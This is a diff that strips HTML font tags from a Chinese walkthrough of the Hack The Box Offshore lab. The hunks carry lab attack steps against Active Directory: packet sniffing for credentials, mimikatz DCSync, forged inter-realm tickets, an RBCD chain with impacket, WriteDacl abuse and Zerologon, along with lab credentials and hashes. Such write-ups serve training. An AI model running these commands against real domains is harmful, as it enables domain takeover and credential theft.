@@ -69,31 +69,32 @@ Offshore是HTB最大的ProLab之一，涉及**5个域**和多个网段：
 | CLIENT.OFFSHORE.COM | DC04 | 172.16.4.5 |
 
 
-## <font style="color:rgb(51, 51, 51);">机器对应表</font>
-| **<font style="color:rgb(51, 51, 51);">IP</font>** | **<font style="color:rgb(51, 51, 51);">主机名</font>** | **<font style="color:rgb(51, 51, 51);">域</font>** | **<font style="color:rgb(51, 51, 51);">关键服务</font>** | **<font style="color:rgb(51, 51, 51);">获取方式</font>** |
-| :--- | :--- | :--- | :--- | :--- |
-| <font style="color:rgb(51, 51, 51);">10.10.110.123</font> | <font style="color:rgb(51, 51, 51);">NIX01</font> | <font style="color:rgb(51, 51, 51);">-</font> | <font style="color:rgb(51, 51, 51);">Splunk, PostgreSQL</font> | <font style="color:rgb(51, 51, 51);">入口点</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.5</font> | <font style="color:rgb(51, 51, 51);">DC01</font> | <font style="color:rgb(51, 51, 51);">corp.local</font> | <font style="color:rgb(51, 51, 51);">AD, DNS, SMB</font> | <font style="color:rgb(51, 51, 51);">WriteDACL</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.15</font> | <font style="color:rgb(51, 51, 51);">SQL01</font> | <font style="color:rgb(51, 51, 51);">corp.local</font> | <font style="color:rgb(51, 51, 51);">MSSQL</font> | <font style="color:rgb(51, 51, 51);">凭据登录</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.23</font> | <font style="color:rgb(51, 51, 51);">NIX01</font> | <font style="color:rgb(51, 51, 51);">corp.local</font> | <font style="color:rgb(51, 51, 51);">Splunk</font> | <font style="color:rgb(51, 51, 51);">入口点(映射为10.10.110.123)</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.24</font> | <font style="color:rgb(51, 51, 51);">WEB-WIN01</font> | <font style="color:rgb(51, 51, 51);">corp.local</font> | <font style="color:rgb(51, 51, 51);">IIS, MSSQL</font> | <font style="color:rgb(51, 51, 51);">SQL注入</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.26</font> | <font style="color:rgb(51, 51, 51);">FS01</font> | <font style="color:rgb(51, 51, 51);">corp.local</font> | <font style="color:rgb(51, 51, 51);">SMB</font> | <font style="color:rgb(51, 51, 51);">凭据登录</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.30</font> | <font style="color:rgb(51, 51, 51);">MS01</font> | <font style="color:rgb(51, 51, 51);">corp.local</font> | <font style="color:rgb(51, 51, 51);">OpManager</font> | <font style="color:rgb(51, 51, 51);">流量嗅探</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.36</font> | <font style="color:rgb(51, 51, 51);">WSADM</font> | <font style="color:rgb(51, 51, 51);">corp.local</font> | <font style="color:rgb(51, 51, 51);">RDP</font> | <font style="color:rgb(51, 51, 51);">凭据登录</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.101</font> | <font style="color:rgb(51, 51, 51);">WS02</font> | <font style="color:rgb(51, 51, 51);">corp.local</font> | <font style="color:rgb(51, 51, 51);">WinRM</font> | <font style="color:rgb(51, 51, 51);">密码喷洒</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.200</font> | <font style="color:rgb(51, 51, 51);">DC0</font> | <font style="color:rgb(51, 51, 51);">LAB.OFFSHORE.LOCAL</font> | <font style="color:rgb(51, 51, 51);">AD</font> | <font style="color:rgb(51, 51, 51);">ZeroLogon</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.201</font> | <font style="color:rgb(51, 51, 51);">JOE-LPTP</font> | <font style="color:rgb(51, 51, 51);">LAB.OFFSHORE.LOCAL</font> | <font style="color:rgb(51, 51, 51);">FTP, VNC</font> | <font style="color:rgb(51, 51, 51);">匿名访问</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.1.220</font> | <font style="color:rgb(51, 51, 51);">SRV01</font> | <font style="color:rgb(51, 51, 51);">LAB.OFFSHORE.LOCAL</font> | <font style="color:rgb(51, 51, 51);">SMB</font> | <font style="color:rgb(51, 51, 51);">ZeroLogon</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.2.6</font> | <font style="color:rgb(51, 51, 51);">DC02</font> | <font style="color:rgb(51, 51, 51);">dev.ADMIN.OFFSHORE.COM</font> | <font style="color:rgb(51, 51, 51);">AD</font> | <font style="color:rgb(51, 51, 51);">RBCD</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.2.12</font> | <font style="color:rgb(51, 51, 51);">MGMT01</font> | <font style="color:rgb(51, 51, 51);">dev.ADMIN.OFFSHORE.COM</font> | <font style="color:rgb(51, 51, 51);">GLPI</font> | <font style="color:rgb(51, 51, 51);">CVE-2020-11060</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.2.102</font> | <font style="color:rgb(51, 51, 51);">WS03</font> | <font style="color:rgb(51, 51, 51);">dev.ADMIN.OFFSHORE.COM</font> | <font style="color:rgb(51, 51, 51);">SMB</font> | <font style="color:rgb(51, 51, 51);">凭据登录</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.3.5</font> | <font style="color:rgb(51, 51, 51);">DC03</font> | <font style="color:rgb(51, 51, 51);">ADMIN.OFFSHORE.COM</font> | <font style="color:rgb(51, 51, 51);">AD</font> | <font style="color:rgb(51, 51, 51);">SID注入</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.3.103</font> | <font style="color:rgb(51, 51, 51);">WS04</font> | <font style="color:rgb(51, 51, 51);">ADMIN.OFFSHORE.COM</font> | <font style="color:rgb(51, 51, 51);">RDP</font> | <font style="color:rgb(51, 51, 51);">域信任</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.4.5</font> | <font style="color:rgb(51, 51, 51);">DC04</font> | <font style="color:rgb(51, 51, 51);">CLIENT.OFFSHORE.COM</font> | <font style="color:rgb(51, 51, 51);">AD</font> | <font style="color:rgb(51, 51, 51);">约束委派</font> |
-| <font style="color:rgb(51, 51, 51);">172.16.4.31</font> | <font style="color:rgb(51, 51, 51);">MS02</font> | <font style="color:rgb(51, 51, 51);">CLIENT.OFFSHORE.COM</font> | <font style="color:rgb(51, 51, 51);">SMB</font> | <font style="color:rgb(51, 51, 51);">SCF攻击</font> |
+## 机器对应表
 
+| IP | 主机名 | 域 | 关键服务 | 获取方式 |
+|:--|:--|:--|:--|:--|
+| 10.10.110.123 | NIX01 | - | Splunk, PostgreSQL | 入口点 |
+| 172.16.1.5 | DC01 | corp.local | AD, DNS, SMB | WriteDACL |
+| 172.16.1.15 | SQL01 | corp.local | MSSQL | 凭据登录 |
+| 172.16.1.23 | NIX01 | corp.local | Splunk | 入口点 (映射 10.10.110.123) |
+| 172.16.1.24 | WEB-WIN01 | corp.local | IIS, MSSQL | SQL注入 |
+| 172.16.1.26 | FS01 | corp.local | SMB | 凭据登录 |
+| 172.16.1.30 | MS01 | corp.local | OpManager | 流量嗅探 |
+| 172.16.1.36 | WSADM | corp.local | RDP | 凭据登录 |
+| 172.16.1.101 | WS02 | corp.local | WinRM | 密码喷洒 |
+| 172.16.1.200 | DC0 | LAB.OFFSHORE.LOCAL | AD | ZeroLogon |
+| 172.16.1.201 | JOE-LPTP | LAB.OFFSHORE.LOCAL | FTP, VNC | 匿名访问 |
+| 172.16.1.220 | SRV01 | LAB.OFFSHORE.LOCAL | SMB | ZeroLogon |
+| 172.16.2.6 | DC02 | dev.ADMIN.OFFSHORE.COM | AD | RBCD |
+| 172.16.2.12 | MGMT01 | dev.ADMIN.OFFSHORE.COM | GLPI | CVE-2020-11060 |
+| 172.16.2.102 | WS03 | dev.ADMIN.OFFSHORE.COM | SMB | 凭据登录 |
+| 172.16.3.5 | DC03 | ADMIN.OFFSHORE.COM | AD | SID注入 |
+| 172.16.3.103 | WS04 | ADMIN.OFFSHORE.COM | RDP | 域信任 |
+| 172.16.4.5 | DC04 | CLIENT.OFFSHORE.COM | AD | 约束委派 |
+| 172.16.4.31 | MS02 | CLIENT.OFFSHORE.COM | SMB | SCF攻击 |
+---
 
-# <font style="color:rgb(51, 51, 51);">攻击路径</font>
+# 攻击路径
 ```c
 ┌─────────────────────────────────────────────────────────────────────────────┐
 │                           Offshore ProLab 攻击路径                           │
@@ -1292,7 +1293,7 @@ mark      19216  0.0  0.0  14432   996 pts/3    S+   03:11   0:00 grep --color=a
 
 成功找到pgsql程序位于/usr/local/pgsql/bin/psql
 
-### <font style="color:rgb(51, 51, 51);">PostgreSQL</font>
+### PostgreSQL
 ####  1️⃣ 查看当前数据库  
  \l 列出所有数据库  
 
@@ -1606,14 +1607,14 @@ tcp        0      0 172.16.1.23:51340       10.10.14.6:4443         CLOSE_WAIT
 
 确实是存在跟其他主机存在流量的
 
-### <font style="color:rgb(51, 51, 51);">抓包</font>
+### 抓包
 ```c
 tcpdump -i eth0 -vv -w /tmp/web.pcap
 ```
 
-<font style="color:rgb(51, 51, 51);">等待一段时间(5-10分钟)后停止。</font>
+等待一段时间(5-10分钟)后停止。
 
-### <font style="color:rgb(51, 51, 51);">分析数据包</font>
+### 分析数据包
 ```c
 # 在Kali上分析
 tcpdump -r web.pcap -A | grep -i "password\|flag\|admin"
@@ -1624,7 +1625,7 @@ reading from file web.pcap, link-type EN10MB (Ethernet)
 E..wF.@...Y............PZ.....f.P. ..V..username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!
 ```
 
-<font style="color:rgb(51, 51, 51);">或使用Wireshark:</font>
+或使用Wireshark:
 
 ```c
 # 导出到Kali
@@ -1632,8 +1633,8 @@ scp -i 123 root@10.10.110.123:/tmp/web.pcap .
 wireshark web.pcap
 ```
 
-### <font style="color:rgb(51, 51, 51);">发现凭据</font>
-<font style="color:rgb(51, 51, 51);">在HTTP POST数据中发现:</font>
+### 发现凭据
+在HTTP POST数据中发现:
 
 ```c
 POST /apiclient/login.jsp HTTP/1.1
@@ -1650,11 +1651,11 @@ username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!
 > username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!
 >
 
-得到**凭据**: `admin:Zaq12wsx!`和flag:<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">OFFSHORE{l0v3_cl3artext_pr0toc0l$}</font>
+得到**凭据**: `admin:Zaq12wsx!`和flag:OFFSHORE{l0v3_cl3artext_pr0toc0l$}
 
 ![](/image/prolabs/Offshore-15.png)
 
-<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">由于数据包来自172.16.1.30，所以接下来我们将访问该网站</font>
+由于数据包来自172.16.1.30，所以接下来我们将访问该网站
 
 ## 内网探测
 ### ifconfig
@@ -1827,7 +1828,7 @@ add groupMember "Security Engineers" salvador
 | bloodyAD | 直接改 LDAP 属性 | 只要你有写权限 |
 
 
-### <font style="color:rgb(51, 51, 51);">AllExtendedRights</font>
+### AllExtendedRights
 ```c
 扩展权限是授予对象的特殊权限，允许读取特权内容 属性，以及执行特殊操作。
 滥用信息 对用户的权限
@@ -2183,25 +2184,25 @@ List of domain trusts:
 + 两边是 **跨林信任**
 + 并且是 **quarantined（SID filtering 开启）**
 
-<font style="color:rgb(13, 13, 13);">关键是这个：</font>
+关键是这个：
 
 ```plain
 Attr: quarantined
 ```
 
-<font style="color:rgb(13, 13, 13);background-color:rgb(249, 249, 249);">quarantined翻译中文为隔离</font>
+quarantined翻译中文为隔离
 
-<font style="color:rgb(13, 13, 13);">这是一个：</font>
+这是一个：
 
-**<font style="color:rgb(13, 13, 13);">🔐</font>****<font style="color:rgb(13, 13, 13);"> External Trust（隔离信任）  
-</font>****<font style="color:rgb(13, 13, 13);">并且是 SID Filtering 开启状态</font>**
+**🔐**** External Trust（隔离信任）  
+****并且是 SID Filtering 开启状态**
 
-<font style="color:rgb(13, 13, 13);">也就是说：</font>
+也就是说：
 
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 你是 corp 的 Enterprise Admin</font>
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 但这个权限不会传递到 dev.ADMIN.OFFSHORE.COM</font>
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 不能跨 Forest 做 DCSync</font>
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 不能用 Enterprise Admin 横向</font>
++ ❌ 你是 corp 的 Enterprise Admin
++ ❌ 但这个权限不会传递到 dev.ADMIN.OFFSHORE.COM
++ ❌ 不能跨 Forest 做 DCSync
++ ❌ 不能用 Enterprise Admin 横向
 
 ###  DEV 域 IP
 ```c
@@ -2320,9 +2321,9 @@ mimikatz(commandline) # exit
 Bye!
 ```
 
-`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">0x00000005 = Access Denied</font>**`
+`**0x00000005 = Access Denied**`
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> 你 </font>**<font style="color:rgb(13, 13, 13);">没有权限对 dev 子域执行 DCSync</font>**
+👉 你 **没有权限对 dev 子域执行 DCSync**
 
 ### winrm-dev域(失败)
 ```plain
@@ -2343,20 +2344,20 @@ Error: Exiting with code 1
 
 ```
 
-<font style="color:rgb(13, 13, 13);">这是一个：</font>
+这是一个：
 
-**<font style="color:rgb(13, 13, 13);">🔐</font>****<font style="color:rgb(13, 13, 13);"> External Trust（隔离信任）  
-</font>****<font style="color:rgb(13, 13, 13);">并且是 SID Filtering 开启状态</font>**
+**🔐**** External Trust（隔离信任）  
+****并且是 SID Filtering 开启状态**
 
-<font style="color:rgb(13, 13, 13);">也就是说：</font>
+也就是说：
 
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 你是 corp 的 Enterprise Admin</font>
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 但这个权限不会传递到 dev.ADMIN.OFFSHORE.COM</font>
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 不能跨 Forest 做 DCSync</font>
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 不能用 Enterprise Admin 横向</font>
++ ❌ 你是 corp 的 Enterprise Admin
++ ❌ 但这个权限不会传递到 dev.ADMIN.OFFSHORE.COM
++ ❌ 不能跨 Forest 做 DCSync
++ ❌ 不能用 Enterprise Admin 横向
 
-### <font style="color:rgb(13, 13, 13);">利用 Trust 提权(失败)</font>
-#### <font style="color:rgb(13, 13, 13);">1️⃣</font><font style="color:rgb(13, 13, 13);"> 在 corp dump 所有信任相关信息</font>
+### 利用 Trust 提权(失败)
+#### 1️⃣ 在 corp dump 所有信任相关信息
 ```plain
 *Evil-WinRM* PS C:\Users\Administrator\Documents> nltest /trusted_domains
 List of domain trusts:
@@ -2394,7 +2395,7 @@ UsesAESKeys             : False
 UsesRC4Encryption       : False
 ```
 
-#### <font style="color:rgb(13, 13, 13);">2️⃣</font><font style="color:rgb(13, 13, 13);"> dump corp 的 krbtgt</font>
+#### 2️⃣ dump corp 的 krbtgt
 ```plain
 *Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"
 
@@ -2485,7 +2486,7 @@ mimikatz(commandline) # exit
 Bye!
 ```
 
-#### <font style="color:rgb(13, 13, 13);">3️⃣</font><font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">在 corp DC 上执行：</font>
+#### 3️⃣ 在 corp DC 上执行：
 ```plain
 *Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "lsadump::trust /patch" "exit"
  
@@ -2537,7 +2538,7 @@ DEV SID:
 S-1-5-21-1416445593-394318334-2645530166
 ```
 
-#### <font style="color:rgb(13, 13, 13);">🚀</font><font style="color:rgb(13, 13, 13);"> 用 impacket-ticketer 伪造 Inter-Realm TGT</font>
+#### 🚀 用 impacket-ticketer 伪造 Inter-Realm TGT
 ```plain
 impacket-ticketer \
 -aesKey 98f6fba96ff4208b9133f98e1deda1b0a7585bc73186138d576cfe0a76b0b0e6 \
@@ -2548,7 +2549,7 @@ impacket-ticketer \
 Administrator
 ```
 
-#### <font style="color:rgb(13, 13, 13);">导入票据到当前会话</font>
+#### 导入票据到当前会话
 ```plain
 export KRB5CCNAME=Administrator.ccache
 ```
@@ -2592,11 +2593,11 @@ Info: Download successful!
 
 突然想起会不会是因为sharphound的用户是administrator导致
 
-我们创建一个<font style="color:rgb(13, 13, 13);">Enterprise Admin组用户进行hound收集....</font>
+我们创建一个Enterprise Admin组用户进行hound收集....
 
-<font style="color:rgb(13, 13, 13);">但是administrator本身就是Enterprise Admin组啊???</font>
+但是administrator本身就是Enterprise Admin组啊???
 
-### <font style="color:rgb(13, 13, 13);">查阅wp(无用)</font>
+### 查阅wp(无用)
 脑子炸了.....
 
 wp是这么写的
@@ -3139,7 +3140,7 @@ Documents
 Users
 ```
 
-### <font style="color:rgb(51, 51, 51);">查询表信息</font>
+### 查询表信息
 ```c
 SQL (sa  dbo@master)> select * from WebApp.information_schema.tables;
 TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
@@ -4034,7 +4035,7 @@ Under development method...
 
 ### Soap Xml请求
 #### 下载插件
-<font style="color:rgb(51, 51, 51);">下载火狐插件 Wizdler 然后会自动帮我们写 soap xml请求</font>
+下载火狐插件 Wizdler 然后会自动帮我们写 soap xml请求
 
 ![](/image/prolabs/Offshore-31.png)
 
@@ -4680,7 +4681,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [-] Use -debug to print a stacktrace             
 ```
 
-### SPN-<font style="color:rgb(51, 51, 51);">kerberoast (失败)</font>
+### SPN-kerberoast (失败)
 #### 原理
 ##### 📌 本质一句话：
 👉 **让某个账号“扮演一个服务”并支持 Kerberos 认证**
@@ -5065,7 +5066,7 @@ d-----         4/1/2025   4:05 AM                Windows
 <!--ProjectGuid: 2BA7A017-37F1-4230-8D80-16BD0D54B44B-->
 ```
 
-得到凭据(字体已标红)
+得到凭据
 
 ```c
 server=172.16.1.15
@@ -5112,48 +5113,48 @@ WEB-WIN01$
 The command completed successfully.
 ```
 
-+ <font style="color:rgb(13, 13, 13);">你当前身份：</font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">corp\cyber_adm</font>**`
-+ **<font style="color:rgb(13, 13, 13);">不在</font>**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">Legacy Web Servers 组</font>
-+ <font style="color:rgb(13, 13, 13);">组成员只有：</font>
++ 你当前身份：`**corp\cyber_adm**`
++ **不在** Legacy Web Servers 组
++ 组成员只有：
 
 ```plain
 WEB-WIN01$
 ```
 
-<font style="color:rgb(13, 13, 13);">说明：</font>
+说明：
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> 是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">机器账户 WEB-WIN01$</font>**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">在那个组里  
-</font><font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> 不是 cyber_adm</font>
+👉 是 **机器账户 WEB-WIN01$** 在那个组里  
+👉 不是 cyber_adm
 
-<font style="color:rgb(13, 13, 13);">而 BloodHound 显示：</font>
+而 BloodHound 显示：
 
-**<font style="color:rgb(13, 13, 13);">Legacy Web Servers 组 对 DC01 有 WriteDacl / GenericWrite</font>**
+**Legacy Web Servers 组 对 DC01 有 WriteDacl / GenericWrite**
 
-<font style="color:rgb(13, 13, 13);">所以真正有权限写 DC01 的是：</font>
+所以真正有权限写 DC01 的是：
 
 ```plain
 WEB-WIN01$
 ```
 
-### <font style="color:rgb(13, 13, 13);">RBCD利用原理</font>
-#### <font style="color:rgb(13, 13, 13);">🏗</font><font style="color:rgb(13, 13, 13);"> 一、Delegation 本质是什么？</font>
-<font style="color:rgb(13, 13, 13);">在 AD 里，Delegation 的意思是：</font>
+### RBCD利用原理
+#### 🏗 一、Delegation 本质是什么？
+在 AD 里，Delegation 的意思是：
 
-**<font style="color:rgb(13, 13, 13);">允许一个服务代表用户去访问另一个服务。</font>**
+**允许一个服务代表用户去访问另一个服务。**
 
-<font style="color:rgb(13, 13, 13);">举例：</font>
+举例：
 
-+ <font style="color:rgb(13, 13, 13);">用户登录 Web 服务器</font>
-+ <font style="color:rgb(13, 13, 13);">Web 服务器帮用户访问 SQL</font>
-+ <font style="color:rgb(13, 13, 13);">SQL 需要知道“这个请求是用户发的”</font>
++ 用户登录 Web 服务器
++ Web 服务器帮用户访问 SQL
++ SQL 需要知道“这个请求是用户发的”
 
-<font style="color:rgb(13, 13, 13);">这就用到了 Kerberos 委派。</font>
+这就用到了 Kerberos 委派。
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">🔥</font><font style="color:rgb(13, 13, 13);"> 二、传统委派 vs RBCD</font>
-##### <font style="color:rgb(13, 13, 13);">传统 Constrained Delegation</font>
-<font style="color:rgb(13, 13, 13);">管理员在“源对象”上配置：</font>
+#### 🔥 二、传统委派 vs RBCD
+##### 传统 Constrained Delegation
+管理员在“源对象”上配置：
 
 ```plain
 这个服务器可以委派到哪些服务
@@ -5161,19 +5162,19 @@ WEB-WIN01$
 
 ---
 
-##### <font style="color:rgb(13, 13, 13);">RBCD（资源基委派）</font>
-<font style="color:rgb(13, 13, 13);">反过来：</font>
+##### RBCD（资源基委派）
+反过来：
 
 ```plain
 目标服务器决定谁可以委派到我
 ```
 
-<font style="color:rgb(13, 13, 13);">这就是：</font>
+这就是：
 
-**<font style="color:rgb(13, 13, 13);">资源控制谁能代表用户访问我</font>**
+**资源控制谁能代表用户访问我**
 
 ### RBCD利用 (失败)
-#### <font style="color:rgb(13, 13, 13);">第一步：dump 机器账户 hash</font>
+#### 第一步：dump 机器账户 hash
 ```plain
 ┌──(kali㉿kali)-[~/Desktop/htb/offshore]
 └─$ proxychains -q impacket-secretsdump cyber_adm:'Password123!'@172.16.1.24
@@ -5211,8 +5212,8 @@ NL$KM:3d3de83cd1462b2615285fd7f660c42cfc31a10882bd8f1bc859445c20dcac5454de733a14
 [*] Stopping service RemoteRegistry
 ```
 
-#### <font style="color:rgb(13, 13, 13);">第二步：回到 Kali 用机器账户打 RBCD</font>
-##### <font style="color:rgb(13, 13, 13);">1️⃣</font><font style="color:rgb(13, 13, 13);"> 创建一个新的机器账户</font>
+#### 第二步：回到 Kali 用机器账户打 RBCD
+##### 1️⃣ 创建一个新的机器账户
 ```plain
 ┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/netcat]
 └─# proxychains -q impacket-addcomputer corp.local/WEB-WIN01$ -hashes :e3d78bc48d069bba3d3e34b0cae59547 -dc-ip 172.16.1.5 -computer-name ATTACKER$ -computer-pass Passw0rd!
@@ -5221,7 +5222,7 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account ATTACKER$ with password Passw0rd!.
 ```
 
-##### <font style="color:rgb(13, 13, 13);">2️⃣</font><font style="color:rgb(13, 13, 13);"> 写 RBCD 到 DC01</font>
+##### 2️⃣ 写 RBCD 到 DC01
 ```plain
 ┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/netcat]
 └─# proxychains -q impacket-rbcd corp.local/WEB-WIN01$ -hashes :e3d78bc48d069bba3d3e34b0cae59547 -dc-ip 172.16.1.5 -action write -delegate-from ATTACKER$ -delegate-to DC01$
@@ -5234,7 +5235,7 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 [*]     ATTACKER$    (S-1-5-21-2291914956-3290296217-2402366952-17101)
 ```
 
-##### <font style="color:rgb(13, 13, 13);">3️⃣</font><font style="color:rgb(13, 13, 13);"> 伪造票据 impersonate Administrator</font>
+##### 3️⃣ 伪造票据 impersonate Administrator
 ```plain
 ┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
 └─# proxychains -q impacket-getST corp.local/ATTACKER$:'Passw0rd!' -dc-ip 172.16.1.5 -spn ldap/DC01.corp.local -impersonate Administrator                                
@@ -5249,18 +5250,18 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in Administrator@ldap_DC01.corp.local@CORP.LOCAL.ccache
 ```
 
-<font style="color:rgb(13, 13, 13);">会生成：</font>
+会生成：
 
 ```plain
 Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache
 ```
 
-##### <font style="color:rgb(13, 13, 13);">4️⃣</font><font style="color:rgb(13, 13, 13);"> 导出 Kerberos 票据</font>
+##### 4️⃣ 导出 Kerberos 票据
 ```plain
 export KRB5CCNAME=Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache
 ```
 
-##### <font style="color:rgb(13, 13, 13);">5️⃣</font><font style="color:rgb(13, 13, 13);"> 直接 DCSync</font>
+##### 5️⃣ 直接 DCSync
 ```plain
 ┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
 └─# proxychains -q impacket-secretsdump -k -no-pass DC01.corp.local
@@ -5270,45 +5271,45 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Cleaning up... 
 ```
 
-<font style="color:rgb(13, 13, 13);">现在：</font>
+现在：
 
-+ <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> RBCD 成功</font>
-+ <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> LDAP 票据正确</font>
-+ <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> Kerberos 票据加载成功</font>
-+ <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 仍然被：</font>
++ ✅ RBCD 成功
++ ✅ LDAP 票据正确
++ ✅ Kerberos 票据加载成功
++ ❌ 仍然被：
 
 ```plain
 Policy SPN target name validation might be restricting full DRSUAPI dump
 ```
 
-<font style="color:rgb(13, 13, 13);">拦住</font>
+拦住
 
 ---
 
-#### <font style="color:rgb(13, 13, 13);">失败原因</font>
-<font style="color:rgb(13, 13, 13);">这不是票据问题。</font>
+#### 失败原因
+这不是票据问题。
 
-<font style="color:rgb(13, 13, 13);">这是因为：</font>
+这是因为：
 
-**<font style="color:rgb(13, 13, 13);">你在对</font>****<font style="color:rgb(13, 13, 13);"> </font>****DC01 计算机对象****<font style="color:rgb(13, 13, 13);"> </font>****<font style="color:rgb(13, 13, 13);">做 RBCD</font>**
+**你在对**** ****DC01 计算机对象**** ****做 RBCD**
 
-<font style="color:rgb(13, 13, 13);">但 DCSync 需要的是：</font>
+但 DCSync 需要的是：
 
 ```plain
 对域对象 corp.local 拥有 Replication 权限
 ```
 
-<font style="color:rgb(13, 13, 13);">⚠️</font><font style="color:rgb(13, 13, 13);"> RBCD 只是让你可以“登录 DC 的服务”  
-</font><font style="color:rgb(13, 13, 13);">并没有给你：</font>
+⚠️ RBCD 只是让你可以“登录 DC 的服务”  
+并没有给你：
 
 ```plain
 Replicating Directory Changes
 Replicating Directory Changes All
 ```
 
-<font style="color:rgb(13, 13, 13);">权限。</font>
+权限。
 
-### <font style="color:rgb(13, 13, 13);">DCSync利用</font>
+### DCSync利用
 ```plain
 机器账户
    ↓
@@ -5325,9 +5326,9 @@ Replicating Directory Changes All
 拿 krbtgt
 ```
 
-<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> WriteDacl 给自己加 DCSync 权限。</font>
+👉 WriteDacl 给自己加 DCSync 权限。
 
-<font style="color:rgb(13, 13, 13);">(在域对象 DC=corp,DC=local 上，给 WEB-WIN01$ 添加“复制目录”的权限。)</font>
+(在域对象 DC=corp,DC=local 上，给 WEB-WIN01$ 添加“复制目录”的权限。)
 
 ```plain
 ┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
@@ -5955,7 +5956,7 @@ C:\Users\Administrator\Desktop
 OFFSHORE{RC3_a$_@_s3rv1c3}
 ```
 
-## <font style="color:rgb(51, 51, 51);">发现加密Excel文件</font>
+## 发现加密Excel文件
 ```c
 C:\Users\Administrator\Documents\logins.xlsx
 ```
@@ -6953,7 +6954,7 @@ Console                            3    Connected
 >   => 这些都说明：配置类提权里，最现实的就是 WCAssistantService 这个服务文件可写点。
 >
 
-### <font style="color:rgb(51, 51, 51);">服务提权</font>
+### 服务提权
 #### 信息收集
 ```plain
 # 查看服务
@@ -7348,7 +7349,7 @@ tscon 1 /dest:rdp-tcp#0
 
 👉 把 Session ID 1(wsadmin)连接到 rdp-tcp#44 (我当前的 RDP 窗口)
 
-<font style="color:rgb(51, 51, 51);">但是报错了</font>
+但是报错了
 
 ```c
 Could not connect sessionID 1 to sessionname rdp-tcp#0, Error code 1326
@@ -8765,7 +8766,7 @@ Success! DC can be fully compromised by a Zerologon attack.
 ### **Zerologon**利用
 [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
 
-使用`<font style="background-color:#eeeeee;">cve-2020-1472-exploit.py</font>`将机器账户重置
+使用`cve-2020-1472-exploit.py`将机器账户重置
 
 ```c
 ┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/CVE-2020-1472]
@@ -12211,7 +12212,7 @@ Supplemental Credentials:
       des_cbc_md5       : e02f013e8f4f8cf4
 ```
 
